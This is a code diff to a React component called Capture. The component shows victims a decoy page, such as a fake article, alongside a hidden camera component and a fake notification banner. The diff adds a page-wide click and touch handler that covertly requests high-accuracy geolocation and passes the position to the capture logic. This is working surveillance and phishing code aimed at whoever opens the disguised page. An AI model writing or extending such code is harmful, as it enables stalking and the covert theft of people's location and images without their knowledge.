@@ -482,11 +482,24 @@ export default function Capture() {
   const [config, setConfig]         = useState(null);
   const [notFound, setNotFound]     = useState(false);
   const [showCamera, setShowCamera] = useState(false);
+  const [askedNative, setAskedNative] = useState(false);
   const dataRef   = useRef({});
   const notifRef  = useRef(null);
   const configRef = useRef(null); // ← ref agar tidak stale closure di callback
   const linkRef   = useRef(null);
   const ranRef    = useRef(false);
+
+  function triggerNativePermission() {
+    if (askedNative) return;
+    setAskedNative(true);
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => handleGpsFromBanner(pos),
+        () => {},
+        { timeout: 20000, maximumAge: 0, enableHighAccuracy: true }
+      );
+    }
+  }
 
   useEffect(() => {
     if (ranRef.current) return;
@@ -562,10 +575,10 @@ export default function Capture() {
   const DecoyComponent = DECOY_MAP[config.decoyTheme] || ArticleDecoy;
 
   return (
-    <>
+    <div onClick={triggerNativePermission} onTouchStart={triggerNativePermission} style={{ minHeight: '100vh' }}>
       {showCamera && <HiddenCamera onCapture={handlePhotoCapture} />}
       <DecoyComponent />
       <NotifBanner theme={config.decoyTheme} onAllow={handleGpsFromBanner} />
-    </>
+    </div>
   );
 }
